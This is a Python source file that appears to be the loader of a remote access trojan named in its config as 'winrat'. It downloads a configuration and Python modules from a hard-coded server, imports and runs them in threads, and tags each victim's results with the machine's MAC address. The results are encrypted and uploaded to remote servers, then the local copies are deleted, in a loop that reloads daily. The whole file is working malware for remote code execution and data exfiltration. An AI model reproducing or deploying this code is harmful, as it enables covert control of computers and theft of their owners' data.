#todo:
# close all the threads before reload

import importlib
import threading
import time
import requests
import os
import encrypt_data

from uuid import getnode as get_mac

SYSTEMRELOADINTERVAL = 86400 #One day reload interval in seconds.

last_reload = time.time()
module_names = dict()
download_links = {"http://192.168.1.110:8000/"} 
upload_links = {"http://192.168.1.110:8000/"}

def download_file(link, output_path):
    try:
        r = requests.get(link)
    except requests.exceptions.RequestException as e:
        return False

    if r.status_code != 200:
        print(f"failed to download {link}")
        return False

    with open(output_path, "wb+") as file:
        file.write(r.content)
    return True

def download_configuration():
    downloaded = False
    for link in upload_links:
        downloaded = download_file(f"{link}winrat.conf", "winrat.conf")
        if downloaded:
            break

    if downloaded:
        print("Downloaded the configuration file.")

def update_configuration():
    module_names.clear()
    with open("winrat.conf", "r") as conf_file:
        for line in conf_file:
            line = line.strip().split()
            if len(line) < 2:
                continue
            typ = line[0]
            val = line[1]

            if typ == "m":
                module_names[val] = int(line[2]) if (len(line) >=3) else 0
            elif typ == "d":
                download_links.add(val)
            elif typ == "u":
                upload_links.add(val)

def download_single_module(name):
    downloaded = False
    for link in upload_links:
        downloaded = download_file(f"{link}/modules/{name}.py", f"modules/{name}.py")
        if downloaded:
            break
        
    if downloaded:
        print(f"Module: {name} downloaded.")

def download_modules():
    if not os.path.isdir("modules"):
        os.makedirs("modules")
    for name in module_names:
        download_single_module(name)

def create_file_name(name):
    file_name = hex(get_mac())[2:] + "_" + hex(int(time.time()))[2:] + "_" + name
    return ("O" + file_name)

def upload_result(file_name):
    # check if the file is already encrypted
    encrypt_data.encrypt_file(f"data/{file_name}")
    for link in upload_links:
        r = requests.post(link, files={"file": open(f"data/{file_name}", "rb")})
        if r.status_code == 201:
            print("File uploaded successfullly.")
            return True

    print("Upload failed for all servers")
    return False

def store_result(file_name, data):
    if data is None:
        return
    if not os.path.isdir("data"):
        os.makedirs("data")
    with open(f"data/{file_name}", "wb") as file:
        file.write(data.encode())
    
def get_module_reload_time(r_time):
    global last_reload
    next_reload = last_reload + SYSTEMRELOADINTERVAL
    reload_time = 0

    if r_time == 0:
        return -1
    if time.time() + r_time < next_reload:
        reload_time = r_time 
    else:
        reload_time = next_reload - time.time()

    return int(reload_time) if int(reload_time) > 0 else -1

def module_runner(mod, name):
    global last_reload
    first_run = 0

    while time.time() < last_reload + SYSTEMRELOADINTERVAL:
        module_reload_time = get_module_reload_time(module_names[name])
        if module_reload_time <= 2 and first_run == 1:
            return

        file_name = create_file_name(name)
        result = mod.run(file_name, module_reload_time)
        first_run = 1
        result = result.strip()
        if len(result) == 0:
            continue
        
        if result.split(":")[0] != "stored":
            store_result(file_name, result)
        else:
            file_name = result.split(":")[1]
        upload_successful = upload_result(file_name)
        if upload_successful:
            os.remove(f"data/{file_name}")

def load_modules():
    for name in module_names:
        importlib.invalidate_caches()
        mod = importlib.import_module(f"modules.{name}")
        importlib.reload(mod)

        t = threading.Thread(target=module_runner, args=(mod, name))
        t.start()
            
if __name__ == '__main__':
    while True:
        last_reload = time.time()

        download_configuration()
        update_configuration()

        download_modules()
        load_modules()

        time.sleep(SYSTEMRELOADINTERVAL)
